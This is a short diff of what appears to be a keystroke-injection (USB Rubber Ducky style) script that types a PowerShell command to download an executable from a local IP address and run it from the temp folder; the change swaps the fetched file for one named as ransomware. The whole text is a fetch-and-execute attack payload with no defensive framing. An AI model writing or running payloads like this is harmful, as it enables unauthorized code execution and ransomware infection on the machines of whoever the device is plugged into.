@@ -7,7 +7,7 @@ ENTER
 DELAY 500
 ALT y
 DELAY 500
-STRING wget 'http://192.168.85.128/OemKey.exe' -outfile $Env:temp\Oemkey.exe ; .$Env:temp\Oemkey.exe
+STRING wget 'http://192.168.85.128/ransonware.exe' -outfile $Env:temp\ransonware.exe ; .$Env:temp\ransonware.exe
 ENTER
 DELAY 200
 STRING exit
